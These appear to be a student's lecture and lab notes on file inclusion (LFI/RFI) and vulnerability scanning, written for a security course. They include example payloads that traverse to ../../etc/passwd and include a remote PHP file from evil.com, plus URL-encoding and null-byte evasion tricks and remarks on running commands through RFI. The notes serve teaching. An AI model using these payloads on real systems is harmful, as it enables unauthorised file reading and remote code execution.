# File Inclusion and Vulnerability Scanning

## Lecture Notes: LFI and RFI

### Web Application Review

* web applications are often built on default file system setups (ex. /var/www/html) with default files (ex. index.html)

### Directory Traversal

* web applications don't always properly validate user input
* attacker can read files without authorization
* most common method is ../ or ..\\

### Directory Traversal vs. File Inclusion

* directory traversal can lead to file inclusion
* execution is the main difference

### LFI and RFI

* Local File Inclusion
  * attackers use local files to exploit areas of the application vulnerable to file inclusion
  * ex. website.com/view.php?file=file.txt | website.com/view.php?file=../../etc/passwd
* Remote File Inclusion
  * attackers use remote files to exploit areas of the application vulnerable to file inclusion
  * ex. website.com/view.php?file=file.txt | website.com/view.php?file=http://evil.com/malware.php

### Evading Input Sanitization

* URL encode parameters
  * ../ -> %2e%2e%2f
* null byte
  * ../../etc/passwd%00.txt

## Lecture Notes: Vulnerability Scanning

* a technique used to identify hosts/host attributes and associated vulnerabilities
* pros:
  * fast
    * less expensive than a pentest
    * used by pentesters during a time-boxed engagement
  * can usually be automated
* cons:
  * not as thorough
  * false positives
  * ratings can be subject to change
    * environment
    * configuration
    * data
  * not stealthy by default
* why use?
  * compliance
  * easy
  * fast

### Types of Scanners

* network
* web application

### Examples of Scanners

* traditional
  * OpenVAS
  * Nessus
  * Rapid7
* web application
  * Nikto
  * Burp suite
  * ZAP

## Activity: Scanning with Nikto

```
nikto -host 10.0.5.24
```

## Activity: File Inclusion Vulnerabilities

```
mkdir file-inclusion
cd file-inclusion
nano index.php
nano page1.html
nano page2.html
nano page3.html
php -S 127.0.0.1:9000
# navigate to 127.0.0.1:9000 in web browser
nano rfi.html
python3 -m http.server 8000
cp /etc/php/8.1/cli/php.ini .
nano php.ini
# change allow_url_include to On
php -S 127.0.0.1:9000 -c php.ini
```

## Bifur and Activities Notes

* was able to use the "Inspect" feature to change the file being requested
* can use ; to string commands together
* can use PHP files via RFI to run commands (system function in PHP)
